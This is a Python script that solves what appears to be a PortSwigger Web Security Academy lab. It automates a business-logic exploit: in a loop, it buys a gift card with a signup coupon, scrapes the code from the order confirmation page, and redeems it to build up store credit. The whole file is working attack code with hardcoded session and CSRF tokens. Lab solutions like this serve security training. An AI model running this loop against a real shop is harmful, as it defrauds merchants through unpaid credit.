#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

SESSION  : str = "QnjNAd2kLd8L2jmD6qz85kYruUo2pqr4"
LAB_ID   : str = "0ab40074034a9247818f1b410014004c"
CSRF     : str = "29vJlTmkwQpFCfNyYyN4BEMBv2gdT16q"

URL      : str = f"https://{LAB_ID}.web-security-academy.net"

# ----------------------------

def get_money(url: str, session : str, csrf : str):
    proxies : dict = {}
    headers : dict = { "Cookie": f"session={session}" }
    verify : bool = True
    allow_redirects : bool = False
    
    req1 = requests.post(URL + "/cart",
                         headers=headers,
                         data={"productId": 2, "redir": "PRODUCT", "quantity": 1},
                         proxies=proxies, verify=verify, allow_redirects=allow_redirects)    
    req2 = requests.post(URL + "/cart/coupon",
                         headers=headers,
                         data={"csrf": csrf, "coupon": "SIGNUP30"},
                         proxies=proxies, verify=verify, allow_redirects=allow_redirects)    
    req3 = requests.post(URL + "/cart/checkout",
                         headers=headers,
                         data={"csrf": csrf},
                         proxies=proxies, verify=verify, allow_redirects=allow_redirects)    
    req4 = requests.get(URL + "/cart/order-confirmation",
                        headers=headers,
                        params={"order-confirmed": "true"},
                        proxies=proxies, verify=verify, allow_redirects=allow_redirects)
    
    soup = BeautifulSoup(req4.text, "html.parser")
    codes = soup.find_all("table", {"class": "is-table-numbers"})[0]
    code = codes.find_all("td")[0].text
    
    req5 = requests.post(URL + "/gift-card",
                         headers=headers,
                         data={"csrf": csrf, "gift-card": code},
                         proxies=proxies, verify=verify, allow_redirects=allow_redirects)

# ----------------------------

def main():
    global URL, SESSION, CSRF

    current = 228
    while current < 1338:
        get_money(URL, SESSION, CSRF)
        current += 3

if __name__ == "__main__":
    main()
